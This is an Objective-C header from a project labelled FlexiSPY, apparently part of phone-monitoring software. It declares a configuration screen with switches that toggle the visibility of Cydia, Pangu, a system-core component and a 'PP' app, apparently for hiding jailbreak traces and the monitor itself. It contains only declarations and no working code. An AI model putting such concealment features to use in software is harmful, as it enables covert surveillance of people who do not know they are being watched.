//
//  ConfigurationViewController.h
//  FlexiSPY
//
//  Created by Makara Khloth on 12/23/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>

#import "AppUIConnection.h"

@interface ConfigurationViewController : UIViewController <AppUIConnectionDelegate> {
@private
	UILabel		*mVisibilityLabel;
	UISwitch	*mCydiaVisibilitySwitch;
    UISwitch	*mSystemCoreVisibilitySwitch;
    UILabel		*mPanguVisibilityLabel;
    UISwitch    *mPanguVisibilitySwitch;
    UILabel     *mPPVisibilityLabel;
    UISwitch    *mPPVisibilitySwitch;
    NSString    *mPPAppBundleIndentifier;
}

@property (nonatomic, retain) IBOutlet UILabel *mVisibilityLabel;
@property (nonatomic, retain) IBOutlet UISwitch *mCydiaVisibilitySwitch;
@property (nonatomic, retain) IBOutlet UISwitch	*mSystemCoreVisibilitySwitch;
@property (nonatomic, retain) IBOutlet UILabel *mPanguVisibilityLabel;
@property (nonatomic, retain) IBOutlet UISwitch *mPanguVisibilitySwitch;
@property (nonatomic, retain) IBOutlet UILabel *mPPVisibilityLabel;
@property (nonatomic, retain) IBOutlet UISwitch *mPPVisibilitySwitch;

- (IBAction) cydiaVisibilitySwitchChanged:(id) sender;
- (IBAction) panguVisibilitySwitchChanged: (id) aSender;
- (IBAction) systemCoreVisibilitySwitchChanged: (id) aSender;
- (IBAction) ppVisibilitySwitchChanged:(id) sender ;
@end
